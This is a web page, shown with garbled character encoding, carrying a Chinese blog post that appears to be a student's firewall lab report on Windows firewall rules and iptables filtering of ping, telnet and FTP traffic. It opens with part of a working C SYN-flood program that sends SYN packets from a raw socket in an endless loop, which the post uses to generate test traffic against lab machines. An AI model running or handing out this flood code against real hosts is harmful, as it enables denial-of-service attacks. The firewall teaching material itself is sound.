å…¥åŸå§‹å¥—æ¥å­—ã€ç›®æ ‡IPåœ°å€å’Œç›®æ ‡ç«¯å£ï¼Œç„¶åé€šè¿‡è°ƒç”¨ sendto() å‡½æ•°å‘æœåŠ¡ç«¯å‘é€ä¸€ä¸ª SYNåŒ… int send_syn_packet(int sockfd, unsigned int addr, unsigned short port) { struct sockaddr_in skaddr; char packet[256]; int pkt_len; bzero(\u0026skaddr, sizeof(skaddr)); skaddr.sin_family = AF_INET; skaddr.sin_port = htons(port); skaddr.sin_addr.s_addr = addr; printf(\"%då·²æ”»å‡»!\\n\",addr); pkt_len = make_syn_packet(packet, 256, addr, port); return sendto(sockfd, packet, pkt_len, 0, (struct sockaddr *)\u0026skaddr, sizeof(struct sockaddr)); } // ä¸»å‡½æ•° int main(int argc, char *argv[]) { unsigned int addr; unsigned short port; int sockfd; if (argc \u003c 3) { fprintf(stderr, \"Usage: synflood \\n\"); exit(1); } // argv[1] ç›®çš„åœ°å€ // argc[2] ç›®çš„ç«¯å£ addr = inet_addr(argv[1]); port = atoi(argv[2]); // åˆ¤æ–­ç«¯å£æ˜¯å¦ å­˜åœ¨ if (port \u003c 0 || port \u003e 65535) { fprintf(stderr, \"Invalid destination port number: %s\\n\", argv[2]); exit(1); } // å¼€å¯socket sockfd = make_raw_socket(); if (sockfd == -1) { fprintf(stderr, \"Failed to make raw socket\\n\"); exit(1); } // for æ— é™å¾ªç¯ï¼Œå‘é€synåŒ… for (;;) { if (send_syn_packet(sockfd, addr, port) \u003c 0) { fprintf(stderr, \"Failed to send syn packet\\n\"); } } close(sockfd); return 0; } Windowsé˜²ç«å¢™ï¼šå¤©ç½‘é˜²ç«å¢™\nLinuxé˜²ç«å¢™ï¼š iptables\nFTPæœåŠ¡å™¨ï¼šSer-U\næŠ“åŒ…å·¥å…·ï¼šWireshark\nUDPæ”»å‡»ï¼šUDP-Flood\n0x03 å®éªŒå†…å®¹ 3.1 windowsé˜²ç«å¢™ 3.1.1 è¿‡æ»¤è¿œç¨‹æœåŠ¡å™¨ï¼ˆRï¼‰åˆ°æœ¬åœ°ä¸»æœºï¼ˆLï¼‰çš„TCPæ•°æ® åœ¨é˜²ç«å¢™ä¸­æ·»åŠ å¦‚ä¸‹è§„åˆ™ï¼š è¿™æ ·æ¥æ”¶åˆ°çš„æ‰€æœ‰TCPåŒ…éƒ½ä¼šè¢«æ‹¦æˆªï¼Œå¹¶ä¸”è¢«è®°å½•ã€‚ æ²¡æœ‰å¼€å¯é˜²ç«å¢™å‰ï¼Œåœ¨ç»ˆç«¯æ‰§è¡Œå‘é€éšæœºç«¯å£çš„tcpç¨‹åº é€šè¿‡WiresharkæŠ“åŒ…ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°æ­¤æ—¶çš„TCPåŒ…å¹¶æ²¡æœ‰è¢«æ‹¦æˆªã€‚ å¼€å¯é˜²ç«å¢™ï¼Œå†åº¦å¯åŠ¨ç¨‹åºã€‚ å¯ä»¥çœ‹åˆ°é˜²ç«å¢™è¿›è¡Œæé†’ï¼Œå¹¶ä¸”æ—¥å¿—é‡Œé¢æ˜¾ç¤ºäº†æ”»å‡»æœºå‘é¶æœº192.168.195.131çš„ç«¯å£tcpè¿æ¥ã€‚ å› æ­¤åŠ ä¸Šè¯¥ç«¯å£åï¼Œæ‰€æœ‰tcpåŒ…éƒ½è¢«æˆªæ–­äº†ã€‚ 3.1.2 è¿‡æ»¤R-\u003eLä¸­æ•°æ®åŒ…æºç«¯å£ä¸º21æˆ–80çš„æ•°æ® å‘é€åˆ°ç«¯å£ä¸º21å’Œ80çš„ä¼ è¾“å±‚åè®®å¯èƒ½ä¸ºtcpä¹Ÿå¯èƒ½ä¸ºudp\nå› æ­¤ç¼–å†™è¿›å‡ºè§„åˆ™çš„æ—¶å€™ï¼Œæˆ‘ä»¬éœ€è¦å¯¹TCPå’ŒUDPéƒ½è¿›è¡Œé™åˆ¶ã€‚\nUDP TCP å› ä¸ºæˆ‘çš„å®¢æˆ·ç«¯å·²ç»å¼€å¯äº†21å’Œ80ç«¯å£ï¼Œæ‰€æœ‰æˆ‘ä»¬è¿™é‡Œç›´æ¥é€‰æ‹©å·²æˆæƒå¼€æ”¾çš„ç«¯å£å³å¯ã€‚ TCP\né˜²ç«å¢™å¼€å¯å‰ï¼š\nå¯ä»¥çœ‹åˆ°TCPåŒ…å¯ä»¥å‘åˆ°æœºå™¨ã€‚ å¼€å¯é˜²ç«å¢™\næ”»å‡»80ç«¯å£\nå¯ä»¥çœ‹åˆ°åœ¨æ—¥å¿—é‡Œé¢ç¨‹åºè¿æ¥80ç«¯å£è¢«æ‹’ç»ã€‚ æ”»å‡»21ç«¯å£\nå¯ä»¥çœ‹åˆ°è¿™é‡Œè¿æ¥21ç«¯å£åŒæ ·è¢«æ‹’ç»ã€‚\nUDP\nå…³é—­é˜²ç«å¢™\næ”»å‡»80ç«¯å£\nå¯ä»¥çœ‹åˆ°æŠ“åˆ°udpåŒ…\nå¼€å¯é˜²ç«å¢™\næ”»å‡»80ç«¯å£\nå¯ä»¥çœ‹åˆ°80ç«¯å£çš„udpåŒ…å·²è¢«æ‹¦æˆª æ”»å‡»21ç«¯å£\nå¯ä»¥çœ‹åˆ°21ç«¯å£çš„udpåŒ…å·²è¢«æ‹¦æˆª\n3.1.3 èƒ½å¤Ÿç”±æœ¬æœºç™»å½•ftpæœåŠ¡å™¨æˆåŠŸï¼ˆé€šè¿‡ç”¨æˆ·åã€å¯†ç éªŒè¯ï¼‰ åœ¨windows xp192.168.195.162ä¸­æ­å»ºftpæœåŠ¡å™¨ åˆ›å»ºä¸€ä¸ªftpç”¨æˆ·ï¼Œè´¦æˆ·ä¸ºadminï¼Œå¯†ç ä¸ºadminï¼› æˆ‘ä»¬åœ¨æœ¬æœºè®¿é—®æœåŠ¡å™¨ç«¯ æˆ‘ä»¬æˆåŠŸè®¿é—®åˆ°æœåŠ¡å™¨ç«¯ã€‚ è®¾ç½®è§„åˆ™ å½“æˆ‘ä»¬å‘æœåŠ¡å™¨ç«¯å‘é€ftpè¯·æ±‚çš„æ—¶å€™ï¼Œä¼šé€šè¡Œã€‚ 3.1.4 é˜»æ­¢å°†ftpå†…å®¹åˆ—è¡¨ã€ä¸Šä¼ ã€ä¸‹è½½æ•°æ® è¿™é‡Œæˆ‘ä»¬æ˜¯åŸå…ˆçš„å®¢æˆ·ç«¯ä½œä¸ºæ–°çš„æœåŠ¡å™¨ï¼Œå¦ä¸€å°æœºå­æ¥è®¿é—®è¿™ä¸ªæ–°çš„æœåŠ¡å™¨ï¼Œæˆ‘ä»¬éœ€è¦åœ¨æœåŠ¡åŒºçš„é˜²ç«å¢™ä¸Šé…ç½®è§„åˆ™ï¼Œä»è€Œé˜»æ­¢å®¢æˆ·ç«¯ä¸‹è½½æœåŠ¡å™¨ç«¯å†…å®¹ åœ¨æ–°çš„æœåŠ¡å™¨ç«¯é…ç½®FTP å®¢æˆ·ç«¯æŸ¥çœ‹æ•ˆæœ åœ¨æœåŠ¡å™¨ç«¯é…ç½®é˜²æŠ¤å¢™è§„åˆ™ å½“æ”¶åˆ°ç«¯å£ä¸º21çš„tcpè¯·æ±‚çš„æ—¶å€™æ‹’ç»è¯¥è®¿é—®ï¼Œè¿™æ ·å°±ä¿è¯äº†å®¢æˆ·ç«¯ä¸èƒ½ä»æœåŠ¡å™¨ä¸‹è½½ã€‚ å¼€å¯é˜²ç«å¢™ ç»“æœ æˆ‘ä»¬å¯ä»¥åœ¨æ—¥å¿—é‡Œé¢çœ‹åˆ° IP192.168.195.182å¯¹å®¢æˆ·ç«¯çš„è¿æ¥è¢«æ‹’ç» åŒæ—¶ï¼Œè¯¥ç½‘é¡µä¹Ÿæ— æ³•æ‰“å¼€ï¼Œè‡ªç„¶æŸ¥çœ‹åˆ—è¡¨ä»€ä¹ˆçš„ï¼Œä¸Šä¼ ã€ä¸‹è½½éƒ½æ— æ³•è¿›è¡Œï¼Œ 3.2 Linuxé˜²ç«å¢™ iptables 3.2.1 Iptablesé˜²ç«å¢™çš„å¯åŠ¨åœæ­¢ é¦–å…ˆé€šè¿‡ä»¥ä¸‹å‘½ä»¤å®‰è£…å¥½iptables\n1 2 3 4 systemctl stop firewalld.service systemctl mask firewalld.service yum install iptables-services systemctl enable iptables.service ç„¶åé€šè¿‡å‘½ä»¤service iptables statusæŸ¥çœ‹æ­¤æ—¶çš„iptablesçŠ¶æ€\næ­¤æ—¶é˜²ç«å¢™ä¸ºæ‰“å¼€çŠ¶æ€ å…³é—­é˜²ç«å¢™service iptables stop\nå†åº¦æŸ¥çœ‹æ­¤æ—¶é˜²ç«å¢™çŠ¶æ€ å‘ç°æ­¤æ—¶é˜²ç«å¢™å·²å…³é—­ã€‚ æ‰“å¼€é˜²ç«å¢™service iptables start\nå†æŸ¥çœ‹é˜²ç«å¢™çŠ¶æ€ é˜²ç«å¢™å·²æ‰“å¼€ 3.2.2 Iptablesé˜²ç«å¢™è§„åˆ™æŸ¥çœ‹ã€æ·»åŠ ã€åˆ é™¤ æŸ¥çœ‹\nå‘½ä»¤ iptables -L -n åˆ—å‡ºï¼ˆfilterè¡¨ï¼‰æ‰€æœ‰è§„åˆ™ å‘½ä»¤ iptables -nL â€“line-number åˆ—å‡ºï¼ˆfilterè¡¨ï¼‰æ‰€æœ‰è§„åˆ™ï¼Œå¸¦ç¼–å· å‘½ä»¤ iptables -L -n -t nat åˆ—å‡ºï¼ˆnatè¡¨ï¼‰æ‰€æœ‰è§„åˆ™ æ·»åŠ \næ·»åŠ è§„åˆ™æœ‰ä¸¤ä¸ªå‚æ•°ï¼š-Aå’Œ-Iã€‚å…¶ä¸­-Aæ˜¯æ·»åŠ åˆ°è§„åˆ™çš„æœ«å°¾ï¼›-Iå¯ä»¥æ’å…¥åˆ°æŒ‡å®šä½ç½®ï¼Œæ²¡æœ‰æŒ‡å®šä½ç½®çš„è¯é»˜è®¤æ’å…¥åˆ°è§„åˆ™çš„é¦–éƒ¨ã€‚ å½“å‰è§„åˆ™ï¼š æ·»åŠ ä¸€æ¡è§„åˆ™åˆ°å°¾éƒ¨ï¼šiptables â€“A INPUT -j ACCEPT æ„æ€ä¸ºï¼šå‘filterè¡¨ï¼ˆé»˜è®¤è¡¨ï¼‰çš„INPUTé“¾ä¸­è¿½åŠ ä¸€æ¡è§„åˆ™ï¼Œå…¶åŠŸèƒ½æ˜¯æ¥å—æºåœ°å€ä¸ºä»»æ„ã€ç›®æ ‡åœ°å€ä¸ºé˜²ç«å¢™æœ¬èº«çš„æ‰€æœ‰æ•°æ®åŒ…ã€‚ ç¬¬å…­æ¡å³ä¸ºæˆ‘ä»¬æ–°åŠ å…¥çš„è§„åˆ™ æ·»åŠ ä¸€æ¡è§„åˆ™åˆ°ç¬¬ä¸‰æ¡ï¼š iptables -I INPUT 3 -s 192.168.195.131 -j DROP å¯ä»¥çœ‹åˆ°æ–°è§„åˆ™æ·»åŠ åˆ°ç¬¬ä¸‰æ¡äº† åˆ é™¤\nåˆ é™¤ç”¨-Då‚æ•°\nåˆ é™¤ä¹‹å‰æ·»åŠ çš„è§„åˆ™ iptables -A INPUT -j ACCEPTï¼š\nå‘½ä»¤ï¼š iptables -D INPUT -j ACCEPT\nå¯ä»¥çœ‹åˆ°æˆ‘ä»¬ä¹‹å‰æ·»åŠ çš„ç¬¬ä¸ƒæ¡è§„åˆ™å·²ç»è¢«åˆ é™¤ã€‚ æœ‰æ—¶å€™è¦åˆ é™¤çš„è§„åˆ™å¤ªé•¿ï¼Œåˆ é™¤æ—¶è¦å†™ä¸€å¤§ä¸²ï¼Œæ—¢æµªè´¹æ—¶é—´åˆå®¹æ˜“å†™é”™ï¼Œè¿™æ—¶æˆ‘ä»¬å¯ä»¥å…ˆä½¿ç”¨â€“line-numberæ‰¾å‡ºè¯¥æ¡è§„åˆ™çš„è¡Œå·ï¼Œå†é€šè¿‡è¡Œå·åˆ é™¤è§„åˆ™ã€‚è¿™é‡Œæˆ‘ä»¬åˆ é™¤ç¬¬ä¸‰è¡Œæˆ‘ä»¬æ’å…¥çš„è§„åˆ™ã€‚\nå‘½ä»¤ï¼šiptables -D INPUT 3\nå¯ä»¥çœ‹åˆ°æˆ‘ä»¬æ’å…¥çš„ç¬¬ä¸‰æ¡è§„åˆ™å·²ç»è¢«åˆ é™¤ã€‚\n3.2.3 è®¾ç½®Iptablesé˜²ç«å¢™çš„åŒ…è¿‡æ»¤è§„åˆ™ï¼Œå®ç°ä»¥ä¸‹åŠŸèƒ½ 3.2.3.1 ç¦æ­¢æ‰€æœ‰è¿›å‡ºæœ¬åœ°ä¸»æœºçš„æ•°æ®åŒ…é€šè¿‡ï¼ˆé€šè¿‡PingéªŒè¯ï¼‰ æˆ‘ä»¬é¦–å…ˆå°†æ‰€æœ‰è§„åˆ™éƒ½åˆ é™¤iptables -F å¯ä»¥çœ‹åˆ°æˆ‘ä»¬ä¹‹å‰çš„è§„åˆ™å…¨éƒ¨è¢«æ¸…é™¤æ‰ã€‚ æ­¤æ—¶æˆ‘ä»¬é€šè¿‡æœºå™¨192.168.195.131æ¥pingæˆ‘ä»¬æ­¤æ—¶çš„Linuxä¸»æœº192.168.195.174 æ­£å¸¸å¯ä»¥pingé€š ç¦æ­¢æ‰€æœ‰è¿›å…¥æœ¬åœ°æœºå™¨çš„æ•°æ®åŒ…é€šè¿‡ å‘½ä»¤å¦‚ä¸‹ï¼šiptables -I INPUT -j DROP å°†è§„åˆ™åŠ å…¥åˆ°INPUTé“¾ä¸­ æ‰€æœ‰å‘ç»™æœ¬æœºçš„åŒ…éƒ½ä¼šè¢«ä¸¢å¼ƒæ‰ æ­¤æ—¶å†åº¦pingæˆ‘ä»¬çš„æœ¬æœº192.168.195.174 å¾ˆæ˜æ˜¾çš„ä¸»æœºå·²ç»æ¥æ”¶ä¸åˆ°pingçš„åŒ…äº† 3.2.3.2 å…è®¸æŸç‰¹å®šIPä¸»æœºè¿œç¨‹pingæœ¬åœ°ä¸»æœº å°†æ‰€æœ‰è§„åˆ™æ¸…é›¶iptables -F\nå…è®¸æŸç‰¹å®šIPä¸»æœºè¿œç¨‹pingæœ¬åœ°ä¸»æœº\næˆ‘ä»¬è¿™é‡Œè®¾å®šè¿è¡Œ192.168.195.131å¯ä»¥pingé€šï¼Œå…¶ä½™çš„ä¸»æœºå‡æ— æ³•pingé€šæœºå™¨\nå‘½ä»¤ï¼š\n1 2 iptables -I INPUT -j DROP iptables -I INPUT -s 192.168.195.131 -j ACCEPT å› ä¸ºiptablesä¸­è§„åˆ™çš„æ‰§è¡Œä¸ºä»ä¸Šåˆ°ä¸‹ï¼Œæ‰€ä»¥æŒ‰ç…§ä¸Šè¿°ç»™å®šçš„ç¨‹åºæ’å…¥è§„åˆ™ã€‚\nç»“æœä¸ºï¼š\nè¿™æ ·å°±ä¿è¯æ¥æ”¶åˆ°192.168.195.131çš„åŒ…ï¼Œå…¶ä½™çš„åŒ…å‡ä¸¢å¼ƒã€‚\nè¿™é‡Œç›´æ¥æ”¾å‡ºä¸¤ä¸ªæœºå™¨é˜²ç«å¢™å¼€å¯å‰åpingçš„çŠ¶æ€ã€‚\nå…¶ä»–æœºå™¨ 192.168.195.131 3.2.3.3 å…è®¸æŸç‰¹å®šIPä¸»æœºè¿œç¨‹telnetæˆ–puttyæœ¬åœ°ä¸»æœº å°†æ‰€æœ‰è§„åˆ™æ¸…é›¶iptables -F\nå…è®¸æŸç‰¹å®šIPä¸»æœºè¿œç¨‹telnetæˆ–puttyæœ¬åœ°ä¸»æœº,ï¼Œå¼€å¯ç«¯å£23 å³å¯\nå‘½ä»¤ï¼š\n1 2 iptables -I INPUT -p tcp --dport 23 -j DROP iptables -I INPUT -s 192.168.195.131 -p tcp --dport 23 -j ACCEPT ç›®çš„ç«¯å£ä¸º23çš„è¢«ä¸¢å¼ƒï¼Œå› ä¸ºç¬¬äºŒæ¡è§„åˆ™é¡ºåºåœ¨ç¬¬ä¸€æ¡å‰é¢ï¼Œæ‰€æœ‰å…ˆåˆ¤æ–­æ˜¯å¦ä¸ºç‰¹å®šIPï¼Œæ˜¯çš„åˆ™æ¥å—ï¼Œå¦åˆ™ä¸¢å¼ƒã€‚ å¼€å¯é˜²ç«å¢™å‰ï¼š\n192.168.195.131\nå…¶ä»–æœºå™¨ï¼š\ntelentå‡å¯ä»¥æ­£å¸¸è¿æ¥\nå¼€å¯iptables\nå¯¹äº192.168.195.131çš„æœºå™¨\nå‘ç°ä»ç„¶å¯ä»¥æ­£å¥½è¿æ¥telnet å¯¹äºå…¶ä»–æœºå™¨\nå¯ä»¥çœ‹åˆ°è¿æ¥ä¸åˆ°telnet 0x04 é€‰åšé¢˜ 4.1 ç”±æœ¬æœºç™»å½•ftpæœåŠ¡å™¨æˆåŠŸï¼ˆé€šè¿‡ç”¨æˆ·åã€å¯†ç éªŒè¯ï¼‰ å…è®¸æœ¬æœºç™»å½•å…¶ä»–æœåŠ¡å™¨çš„ftp:192.168.195.162\nå› æ­¤è¿™é‡Œçš„é˜²ç«å¢™ä¸ºoutputå‘å¤–é¢æœåŠ¡å™¨ä»¥21ç«¯å£å‘é€è¯·æ±‚ã€‚\nå‘½ä»¤ï¼šiptables -A OUTPUT -p tcp --sport 21 -j ACCEPT\næ‰€æœ‰æºç«¯å£ä¸º21 å‘å¾€å¤–ç½‘çš„åŒ…éƒ½è¢«å…è®¸é€šè¿‡ã€‚ æ‰§è¡Œé˜²ç«å¢™ä¹‹åï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°æˆ‘ä»¬å‘å¾€å¤–ç½‘21ç«¯å£çš„åŒ…å¯ä»¥è¢«ACCEPT ç„¶åé€šè¿‡ftp 192.168.195.131 è¾“å…¥è´¦æˆ·adminå’Œå¯†ç admin æˆ‘ä»¬æˆåŠŸè¿æ¥åˆ°äº†ftpæœåŠ¡å™¨ã€‚ 4.2 æ— æ³•å°†ftpå†…å®¹åˆ—è¡¨æˆ–ä¸Šä¼ ã€ä¸‹è½½æ•°æ® è¿™é‡Œæˆ‘ä»¬çš„Centos 7æœ¬èº«ä½œä¸ºä¸€ä¸ªFTPæœåŠ¡å™¨æ¥ç­‰å¾…å®¢æˆ·ç«¯çš„è¿æ¥ã€‚\nåœ¨æœ¬åœ°é…ç½®å¥½ftpç¯å¢ƒ\nå¯ä»¥çœ‹åˆ°æˆ‘ä»¬çš„ç¯å¢ƒå·²ç»é…ç½®å®Œæ¯• åŒæ—¶åœ¨å®¢æˆ·ç«¯ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥è®¿é—®LinuxæœåŠ¡å™¨ ä¸ºäº†ç¦æ­¢å…¶ä»–ç”¨æˆ·ä¸‹è½½æˆ‘ä»¬linuxæœåŠ¡å™¨ç«¯çš„æ‰€æœ‰æ•°æ®ï¼Œä¹Ÿé˜²æ­¢ä¸Šä¼ ,å³ç¦æ­¢ç”¨æˆ·è®¿é—®æˆ‘ä»¬çš„FTPæœåŠ¡å™¨ã€‚\næ‰€ä»¥æœ‰å‘½ä»¤ï¼šiptables -I INPUT -p tcp --dport 21 -j DROP æ‰€æœ‰ç›®çš„ç«¯å£ä¸º21çš„æ•°æ®åŒ…éƒ½å°†è¢«ä¸¢å¼ƒ æ­¤æ—¶æˆ‘ä»¬çš„å®¢æˆ·ç«¯å†åº¦è®¿é—®æˆ‘ä»¬çš„Linux FTP æœåŠ¡å™¨ç«¯\nå¯ä»¥çœ‹åˆ°æˆ‘ä»¬æ­¤æ—¶å·²ç»æ— æ³•è®¿é—®è¯¥æ–‡ä»¶å¤¹äº†ã€‚æ— æ³•è®¿é—®åˆ°æˆ‘ä»¬çš„LinuxæœåŠ¡å™¨ 0x05 å®éªŒç»“è®º é€šè¿‡å¯¹Windowsä¸‹å’ŒLinuxä¸‹é˜²ç«å¢™çš„é…ç½®æƒ…å†µï¼Œè‡ªå·±äº²è‡ªç¼–å†™é˜²ç«å¢™çš„ç›¸å…³è§„åˆ™ï¼Œå¯¹åŒ…è¿‡æ»¤é˜²ç«å¢™æœ‰äº†è¿›ä¸€æ­¥çš„äº†è§£å’Œè®¤çŸ¥ã€‚åŒæ—¶é’ˆå¯¹ä¸åŒç¯å¢ƒä¸‹é˜²ç«å¢™é…ç½®ï¼ŒLinuxä¸‹çš„é˜²ç«å¢™é…ç½®åº”è¯¥æ¯”Windwosæ›´ä¸ºè‡ªç”±ï¼Œè‡ªå®šä¹‰çš„æ¯”è¾ƒå¤šã€‚ ",
  "wordCount" : "6572",
  "inLanguage": "en",
  "datePublished": "2022-01-01T21:22:48Z",
  "dateModified": "2022-09-11T15:41:19+08:00",
  "author":[{
    "@type": "Person",
    "name": "Reus09"
  }],
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "http://www.reus09.top/posts/tech/%E9%98%B2%E7%81%AB%E5%A2%99%E5%AE%9E%E9%AA%8C/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "Reus09's Blog",
    "logo": {
      "@type": "ImageObject",
      "url": "https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211103151005.jpeg"
    }
  }
}
</script>
</head>

<body class="" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.body.classList.add('dark');
    } else if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.body.classList.add('dark');
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="http://www.reus09.top" accesskey="h" title="Reus09&#39;s Blog (Alt + H)">Reus09&#39;s Blog</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="http://www.reus09.top/search" title="ğŸ”æœç´¢ (Alt &#43; /)" accesskey=/>
                    <span>ğŸ”æœç´¢</span>
                </a>
            </li>
            <li>
                <a href="http://www.reus09.top/" title="ğŸ ä¸»é¡µ">
                    <span>ğŸ ä¸»é¡µ</span>
                </a>
            </li>
            <li>
                <a href="http://www.reus09.top/posts" title="ğŸ“šæ–‡ç« ">
                    <span>ğŸ“šæ–‡ç« </span>
                </a>
            </li>
            <li>
                <a href="http://www.reus09.top/archives/" title="â±æ—¶é—´è½´">
                    <span>â±æ—¶é—´è½´</span>
                </a>
            </li>
            <li>
                <a href="http://www.reus09.top/tags" title="ğŸ”–æ ‡ç­¾">
                    <span>ğŸ”–æ ‡ç­¾</span>
                </a>
            </li>
            <li>
                <a href="http://www.reus09.top/about" title="ğŸ™‹ğŸ»â€â™‚ï¸å…³äº">
                    <span>ğŸ™‹ğŸ»â€â™‚ï¸å…³äº</span>
                </a>
            </li>
            <li>
                <a href="http://www.reus09.top/links" title="ğŸ¤å‹é“¾">
                    <span>ğŸ¤å‹é“¾</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    <div class="breadcrumbs"><a href="http://www.reus09.top">Home</a>&nbsp;Â»&nbsp;<a href="http://www.reus09.top/posts/">ğŸ“šæ–‡ç« </a>&nbsp;Â»&nbsp;<a href="http://www.reus09.top/posts/tech/">ğŸ‘¨ğŸ»â€ğŸ’»æŠ€æœ¯</a></div>
    <h1 class="post-title">
      é˜²ç«å¢™å®éªŒ
    </h1>
    <div class="post-meta"><span title='2022-01-01 21:22:48 +0000 UTC'>2022-01-01</span>&nbsp;Â·&nbsp;14 min&nbsp;Â·&nbsp;Reus09

</div>
  </header> <aside id="toc-container" class="toc-container wide">
    <div class="toc">
        <details  open>
            <summary accesskey="c" title="(Alt + C)">
                <span class="details">Table of Contents</span>
            </summary>

            <div class="inner"><ul>
                    <li>
                        <a href="#%e9%98%b2%e7%81%ab%e5%a2%99%e5%ae%9e%e9%aa%8c" aria-label="é˜²ç«å¢™å®éªŒ">é˜²ç«å¢™å®éªŒ</a><ul>
                            
                    <li>
                        <a href="#0x01-%e5%ae%9e%e9%aa%8c%e7%9b%ae%e6%a0%87" aria-label="0x01 å®éªŒç›®æ ‡">0x01 å®éªŒç›®æ ‡</a></li>
                    <li>
                        <a href="#0x02-%e5%ae%9e%e9%aa%8c%e5%89%8d%e6%8f%90" aria-label="0x02 å®éªŒå‰æ">0x02 å®éªŒå‰æ</a></li>
                    <li>
                        <a href="#0x03-%e5%ae%9e%e9%aa%8c%e5%86%85%e5%ae%b9" aria-label="0x03 å®éªŒå†…å®¹">0x03 å®éªŒå†…å®¹</a><ul>
                            
                    <li>
                        <a href="#31-windows%e9%98%b2%e7%81%ab%e5%a2%99" aria-label="3.1 windowsé˜²ç«å¢™">3.1 windowsé˜²ç«å¢™</a><ul>
                            
                    <li>
                        <a href="#311-%e8%bf%87%e6%bb%a4%e8%bf%9c%e7%a8%8b%e6%9c%8d%e5%8a%a1%e5%99%a8r%e5%88%b0%e6%9c%ac%e5%9c%b0%e4%b8%bb%e6%9c%bal%e7%9a%84tcp%e6%95%b0%e6%8d%ae" aria-label="3.1.1 è¿‡æ»¤è¿œç¨‹æœåŠ¡å™¨ï¼ˆRï¼‰åˆ°æœ¬åœ°ä¸»æœºï¼ˆLï¼‰çš„TCPæ•°æ®">3.1.1 è¿‡æ»¤è¿œç¨‹æœåŠ¡å™¨ï¼ˆRï¼‰åˆ°æœ¬åœ°ä¸»æœºï¼ˆLï¼‰çš„TCPæ•°æ®</a></li>
                    <li>
                        <a href="#312-%e8%bf%87%e6%bb%a4r-l%e4%b8%ad%e6%95%b0%e6%8d%ae%e5%8c%85%e6%ba%90%e7%ab%af%e5%8f%a3%e4%b8%ba21%e6%88%9680%e7%9a%84%e6%95%b0%e6%8d%ae" aria-label="3.1.2 è¿‡æ»¤R-&amp;gt;Lä¸­æ•°æ®åŒ…æºç«¯å£ä¸º21æˆ–80çš„æ•°æ®">3.1.2 è¿‡æ»¤R-&gt;Lä¸­æ•°æ®åŒ…æºç«¯å£ä¸º21æˆ–80çš„æ•°æ®</a></li>
                    <li>
                        <a href="#313-%e8%83%bd%e5%a4%9f%e7%94%b1%e6%9c%ac%e6%9c%ba%e7%99%bb%e5%bd%95ftp%e6%9c%8d%e5%8a%a1%e5%99%a8%e6%88%90%e5%8a%9f%e9%80%9a%e8%bf%87%e7%94%a8%e6%88%b7%e5%90%8d%e5%af%86%e7%a0%81%e9%aa%8c%e8%af%81" aria-label="3.1.3 èƒ½å¤Ÿç”±æœ¬æœºç™»å½•ftpæœåŠ¡å™¨æˆåŠŸï¼ˆé€šè¿‡ç”¨æˆ·åã€å¯†ç éªŒè¯ï¼‰">3.1.3 èƒ½å¤Ÿç”±æœ¬æœºç™»å½•ftpæœåŠ¡å™¨æˆåŠŸï¼ˆé€šè¿‡ç”¨æˆ·åã€å¯†ç éªŒè¯ï¼‰</a></li>
                    <li>
                        <a href="#314-%e9%98%bb%e6%ad%a2%e5%b0%86ftp%e5%86%85%e5%ae%b9%e5%88%97%e8%a1%a8%e4%b8%8a%e4%bc%a0%e4%b8%8b%e8%bd%bd%e6%95%b0%e6%8d%ae" aria-label="3.1.4 é˜»æ­¢å°†ftpå†…å®¹åˆ—è¡¨ã€ä¸Šä¼ ã€ä¸‹è½½æ•°æ®">3.1.4 é˜»æ­¢å°†ftpå†…å®¹åˆ—è¡¨ã€ä¸Šä¼ ã€ä¸‹è½½æ•°æ®</a></li></ul>
                    </li>
                    <li>
                        <a href="#32-linux%e9%98%b2%e7%81%ab%e5%a2%99-iptables" aria-label="3.2 Linuxé˜²ç«å¢™ iptables">3.2 Linuxé˜²ç«å¢™ iptables</a><ul>
                            
                    <li>
                        <a href="#321-iptables%e9%98%b2%e7%81%ab%e5%a2%99%e7%9a%84%e5%90%af%e5%8a%a8%e5%81%9c%e6%ad%a2" aria-label="3.2.1 Iptablesé˜²ç«å¢™çš„å¯åŠ¨åœæ­¢">3.2.1 Iptablesé˜²ç«å¢™çš„å¯åŠ¨åœæ­¢</a></li>
                    <li>
                        <a href="#322-iptables%e9%98%b2%e7%81%ab%e5%a2%99%e8%a7%84%e5%88%99%e6%9f%a5%e7%9c%8b%e6%b7%bb%e5%8a%a0%e5%88%a0%e9%99%a4" aria-label="3.2.2 Iptablesé˜²ç«å¢™è§„åˆ™æŸ¥çœ‹ã€æ·»åŠ ã€åˆ é™¤">3.2.2 Iptablesé˜²ç«å¢™è§„åˆ™æŸ¥çœ‹ã€æ·»åŠ ã€åˆ é™¤</a></li>
                    <li>
